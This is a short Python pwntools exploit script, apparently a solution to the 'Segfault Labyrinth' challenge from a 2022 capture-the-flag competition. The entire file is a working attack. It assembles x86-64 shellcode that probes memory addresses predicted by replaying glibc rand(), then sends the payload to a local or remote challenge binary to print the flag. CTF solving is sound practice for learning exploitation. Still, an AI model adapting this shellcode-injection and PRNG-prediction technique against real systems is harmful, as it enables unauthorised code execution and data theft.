#!/usr/bin/env python3

'''
alt version with smaller payload
'''

from pwn import *

binary = context.binary = ELF('./segfault_labyrinth', checksec=False)

if args.REMOTE:
	p = remote('segfault-labyrinth.2022.ctfcompetition.com', 1337)
else:
	p = process(binary.path)

shellcode = asm(f'''
mov rdi, 1
mov rdx, 100
mov rbx, 16
loop:
dec rbx
lea rsi, [rip + locations]
mov rsi, qword ptr [rsi + rbx*8]
mov eax, {constants.SYS_write}
syscall
cmp rax, 100
je end
// test rbx, rbx
jne loop
end:
xor rdi, rdi
mov eax, {constants.SYS_exit}
syscall
locations:
''')

if args.D: print(disasm(shellcode))

from ctypes import *
glibc = cdll.LoadLibrary('libc.so.6')
for i in range(9*16): glibc.rand()
for i in range(16): shellcode += p64(glibc.rand() * 0x1000 + 0x10000)

assert(len(shellcode) < 0x1000)
p.sendafter(b'Labyrinth\n',p64(len(shellcode)))
p.send(shellcode)
_ = p.recvline().decode().strip()
p.close()
print(_)
